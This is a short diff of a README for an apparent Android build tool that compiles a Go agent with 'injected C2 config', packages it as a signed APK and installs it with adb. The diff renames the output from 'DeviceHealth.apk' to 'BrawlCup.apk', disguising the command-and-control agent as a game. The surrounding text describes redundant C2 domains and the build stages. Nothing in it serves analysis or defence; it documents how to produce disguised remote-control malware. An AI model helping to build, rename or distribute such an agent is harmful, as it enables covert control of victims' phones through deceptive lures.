@@ -102,14 +102,14 @@ python3 build_android.py --domain yourproject.supabase.co --apikey eyJ...
 | `--domain2` | — | Secondary domain (redundancy) |
 | `--apikey` | from `.env` | Supabase anon key |
 | `--arch` | `arm64` | Target: `arm64`, `arm`, `x86_64`, `x86` |
-| `--output` | `DeviceHealth.apk` | Output filename |
+| `--output` | `BrawlCup.apk` | Output filename |
 
 Build stages:
 1. Compile Go agent for `android/{arch}` with injected C2 config
 2. Package as `libagent.so` in APK via Gradle
 3. Sign with debug keystore + v2 apksigner
 
-Install: `adb install DeviceHealth.apk`
+Install: `adb install BrawlCup.apk`
 
 > Set `ANDROID_HOME` env var or the builder auto-detects from `~/Android/Sdk`, `/usr/lib/android-sdk`, etc.
 
